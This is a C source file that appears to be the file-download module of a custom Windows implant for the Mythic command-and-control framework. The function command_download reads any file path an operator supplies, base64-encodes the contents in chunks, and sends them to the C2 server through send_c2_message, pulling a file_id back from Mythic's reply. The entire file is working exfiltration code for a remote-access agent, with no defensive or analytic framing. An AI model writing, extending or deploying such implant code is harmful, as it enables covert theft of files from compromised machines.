#define _WIN32_WINNT 0x0600
#include "commands.h"
#include "utils.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>

#ifdef INCLUDE_CMD_DOWNLOAD

#define DOWNLOAD_CHUNK_SIZE (512 * 1024)

void command_download(char *task_id, char *params) {
  char path[MAX_PATH] = {0};
  if (params[0] == '{') {
    extract_json_string(params, "path", path, sizeof(path));
  } else {
    strncpy(path, params, sizeof(path) - 1);
  }

  if (strlen(path) == 0) {
    send_task_response(task_id, "Error: no path specified");
    return;
  }

  FILE *f = fopen(path, "rb");
  if (!f) {
    char err[MAX_PATH + 32];
    snprintf(err, sizeof(err), "Error: cannot open file: %s", path);
    send_task_response(task_id, err);
    return;
  }

  fseek(f, 0, SEEK_END);
  long file_size = ftell(f);
  fseek(f, 0, SEEK_SET);

  if (file_size < 0) {
    fclose(f);
    send_task_response(task_id, "Error: cannot determine file size");
    return;
  }

  int total_chunks =
      (int)((file_size + DOWNLOAD_CHUNK_SIZE - 1) / DOWNLOAD_CHUNK_SIZE);
  if (total_chunks == 0)
    total_chunks = 1;

  char *escaped_path = json_escape(path);
  char file_id[128] = {0};
  int success = 1;

  unsigned char *chunk_buf = (unsigned char *)malloc(DOWNLOAD_CHUNK_SIZE);
  if (!chunk_buf) {
    fclose(f);
    free(escaped_path);
    send_task_response(task_id, "Error: out of memory");
    return;
  }

  for (int chunk_num = 1; chunk_num <= total_chunks; chunk_num++) {
    size_t bytes_read = fread(chunk_buf, 1, DOWNLOAD_CHUNK_SIZE, f);
    if (bytes_read == 0)
      break;

    char *b64_chunk = base64_encode(chunk_buf, bytes_read);
    if (!b64_chunk) {
      success = 0;
      break;
    }

    size_t b64_len = strlen(b64_chunk);
    char *json_msg = NULL;

    if (chunk_num == 1) {
      size_t json_size =
          b64_len + strlen(task_id) + strlen(escaped_path) + 256;
      json_msg = (char *)malloc(json_size);
      if (json_msg) {
        snprintf(json_msg, json_size,
                 "{\"action\":\"post_response\",\"responses\":[{\"task_id\":\"%s\","
                 "\"download\":{\"total_chunks\":%d,\"chunk_num\":1,"
                 "\"chunk_data\":\"%s\",\"full_path\":\"%s\","
                 "\"is_screenshot\":false}}]}",
                 task_id, total_chunks, b64_chunk, escaped_path);
      }
    } else {
      size_t json_size = b64_len + strlen(task_id) + strlen(file_id) + 200;
      json_msg = (char *)malloc(json_size);
      if (json_msg) {
        snprintf(json_msg, json_size,
                 "{\"action\":\"post_response\",\"responses\":[{\"task_id\":\"%s\","
                 "\"download\":{\"chunk_num\":%d,\"chunk_data\":\"%s\","
                 "\"file_id\":\"%s\"}}]}",
                 task_id, chunk_num, b64_chunk, file_id);
      }
    }

    free(b64_chunk);

    if (!json_msg) {
      success = 0;
      break;
    }

    char *b64_resp = send_c2_message(json_msg);
    free(json_msg);

    /* Le premier chunk : extraire le file_id retourné par Mythic */
    if (chunk_num == 1) {
      if (b64_resp) {
        char *json_resp =
            process_mythic_response(b64_resp, strlen(b64_resp));
        if (json_resp) {
          extract_json_string(json_resp, "file_id", file_id, sizeof(file_id));
          free(json_resp);
        }
        free(b64_resp);
      }
      if (strlen(file_id) == 0) {
        success = 0;
        break;
      }
    } else {
      if (b64_resp)
        free(b64_resp);
    }
  }

  free(chunk_buf);
  free(escaped_path);
  fclose(f);

  if (success) {
    send_task_response(task_id, "Download complete.");
  } else {
    send_task_response(task_id, "Error: download failed or file_id not received.");
  }
}

#endif
